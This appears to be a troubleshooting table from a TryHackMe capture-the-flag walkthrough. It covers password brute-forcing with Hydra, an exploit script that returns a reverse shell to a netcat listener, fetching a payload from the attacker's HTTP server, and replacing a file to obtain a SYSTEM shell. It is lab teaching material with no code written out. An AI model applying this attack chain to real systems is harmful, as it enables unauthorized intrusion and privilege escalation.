| Hydra doesn't find the password | Make sure you pasted the correct `__VIEWSTATE` value from Burp — they expire quickly, capture a fresh one |
| Exploit runs but shell doesn't appear | Check tun0 IP is correct in exploit_cve.py. Restart nc listener and re-run the script |
| Upload returns 401 error | Your session expired — re-run from the login step. Sessions time out after a few minutes of inactivity |
| `Invoke-WebRequest` fails | Confirm Python HTTP server is still running in Terminal 2. Check the port number matches |
| `Copy-Item` fails | Use the exact PowerShell command — standard `cmd copy` won't work in this shell type |
| SYSTEM shell doesn't arrive after 60 seconds | Re-run the Copy-Item command to confirm the file was replaced. Then wait another full 30 seconds |
| Target machine unresponsive | Request a new machine from TryHackMe and update the IP in exploit_cve.py |
